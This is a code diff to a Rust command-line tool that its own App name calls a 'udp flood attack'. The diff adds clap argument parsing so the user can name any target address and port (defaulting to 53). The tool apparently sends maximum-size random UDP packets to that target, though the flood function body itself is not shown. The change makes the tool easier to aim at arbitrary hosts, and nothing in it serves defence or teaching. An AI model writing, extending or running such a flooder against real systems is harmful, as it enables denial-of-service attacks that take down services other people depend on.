@@ -1,11 +1,8 @@
+use clap::{Arg, App};
 use std::net::UdpSocket;
 use rand::Rng;
-use std::env;
 
-// const ADDR: String = "localhost";
 const PORT: u32 = 53;
-const NB_THREADS: u32 = 1;
-
 const BUF_SIZE: usize = 65507;
 
 fn flood(addr: String, port: u32) {
@@ -22,8 +19,25 @@ fn flood(addr: String, port: u32) {
 }
 
 fn main() {
-    let args: Vec<String> = env::args().collect();
+    let matches = App::new("udp flood attack")
+        .author("Thomas Campistron <irevoire@hotmail.fr>")
+        .arg(Arg::with_name("address")
+             .short("a")
+             .long("addr")
+             .takes_value(true)
+             .required(true)
+             .index(1))
+        .arg(Arg::with_name("port")
+             .short("p")
+             .long("port")
+             .takes_value(true))
+        .get_matches();
 
-    println!("{:?}", args);
-    flood(args[1].to_string(), PORT);
+    let addr = matches.value_of("address").unwrap().to_string();
+    let port: u32 = match matches.value_of("port") {
+        Some(p) => p.parse().unwrap(),
+        None => PORT,
+    };
+
+    flood(addr, port);
 }
